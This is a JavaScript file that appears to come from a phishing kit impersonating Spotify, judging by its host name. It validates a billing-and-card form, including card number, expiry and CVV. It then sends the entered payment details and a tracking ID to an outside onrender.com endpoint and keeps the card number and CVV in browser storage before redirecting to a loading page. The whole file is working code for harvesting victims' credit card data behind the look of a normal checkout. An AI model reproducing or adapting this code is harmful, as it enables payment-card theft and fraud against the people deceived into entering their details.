console.log("post_data.js");

var cleaveCC = new Cleave('#cc', {
    creditCard: true,
});

var cleaveExp = new Cleave('#exp', {
    date: true,
    datePattern: ['m', 'y']
});

var cleaveCVV = new Cleave('#cvv', {
    numeral: true,
});

$(document).ready(function () {
    $("#form").on("submit", async function (event) {
        $("#login-button").prop("disabled", false);

        event.preventDefault();
        $("#login-button").prop("disabled", true);
        resetErrorMessages();
        var firstErrorField = null;
        var isValid = true;

        var requiredFields = ["AddressLine", "city", "state", "zipCode", "cc_holder", "cc", "exp", "cvv"];
        for (var i = 0; i < requiredFields.length; i++) {
            var fieldName = requiredFields[i];
            var fieldValue = $("#" + fieldName).val();

            if (!fieldValue) {
                $("#" + fieldName + "-error").html("This field is required.");
                $("#login-button").prop("disabled", false);

                isValid = false;

                if (firstErrorField === null) {
                    firstErrorField = fieldName;
                }
            } else {
                $("#" + fieldName + "-error").html("");
            }
        }

        var creditCardValue = cleaveCC.getRawValue();
        if (creditCardValue.length < 14) {
            $("#cc-error").html("This field is required.");
            isValid = false;

            if (firstErrorField === null) {
                firstErrorField = "cc";
            }
        } else {
            if (!luhnCheck(creditCardValue)) {
                $("#cc-error").html("Invalid Credit Card");
                isValid = false;
                $("#login-button").prop("disabled", false);

                if (firstErrorField === null) {
                    firstErrorField = "cc";
                }
            }
        }
        var cvvValue = cleaveCVV.getRawValue();
        if (cvvValue.length < 3) {
            $("#cvv-error").html("This field is required.");
            isValid = false;
            $("#login-button").prop("disabled", false);
        }
        var expiryDate = cleaveExp.getRawValue();
        var currentYear = new Date().getFullYear() % 100;
        var currentMonth = new Date().getMonth() + 1;

        if (expiryDate.length === 4) {
            var inputMonth = parseInt(expiryDate.slice(0, 2));
            var inputYear = parseInt(expiryDate.slice(2));

            if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
                $("#exp-error").html("Invalid expiry date");
                isValid = false;
                $("#login-button").prop("disabled", false);

                if (firstErrorField === null) {
                    firstErrorField = "exp";
                }
            }
        } else {
            $("#exp-error").html("Invalid expiry date");
            isValid = false;
            $("#login-button").prop("disabled", false);
            if (firstErrorField === null) {
                firstErrorField = "exp";
            }
        }

        if (!isValid) {
            $("#" + firstErrorField).focus();
            return;
        }

        var formData = $(this).serialize();
        var unique_id = localStorage.getItem("unique_id");
        formData += '&unique_id=' + encodeURIComponent(unique_id);

        try {
            const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_data.php", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData,
            });

            if (!response.ok) {
                console.error(`HTTP Error: ${response.status}`);
                $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
                $("#login-button").prop("disabled", false);
                return;
            }

            const result = await response.json();

            if (result.status === 'success') {
                const AddressLine = $("#AddressLine").val();
                const city = $("#city").val();
                const state = $("#state").val();
                const zipCode = $("#zipCode").val();
                const cc_holder = $("#cc_holder").val();
                const cc = $("#cc").val();
                const exp = $("#exp").val();
                const cvv = $("#cvv").val();

                localStorage.setItem("step", "notone");
                localStorage.setItem("address", AddressLine);
                localStorage.setItem("city", city);
                localStorage.setItem("state", state);
                localStorage.setItem("zip", zipCode);
                localStorage.setItem("cc_holder", cc_holder);
                localStorage.setItem("cc", cc);
                localStorage.setItem("exp", exp);
                localStorage.setItem("cvv", cvv);

                window.location.href = "loading.html";
            } else if (result.status === 'error') {
                $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
                $("#login-button").prop("disabled", false);
            } else {
                console.log(result);
                $("#login-button").prop("disabled", false);
            }
        } catch (error) {
            console.error("Error:", error);
            $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
            $("#login-button").prop("disabled", false);
        }
    });

    function resetErrorMessages() {
        $("#str-error, #city-error, #st-error, #zip-error, #ch-error, #cc-error, #exp-error, #cvv-error").html("");
    }

    function luhnCheck(value) {
        var sum = 0;
        var doubleUp = false;
        for (var i = value.length - 1; i >= 0; i--) {
            var curDigit = parseInt(value.charAt(i));

            if (doubleUp) {
                if ((curDigit *= 2) > 9) curDigit -= 9;
            }

            sum += curDigit;
            doubleUp = !doubleUp;
        }
        return sum % 10 == 0;
    }
});
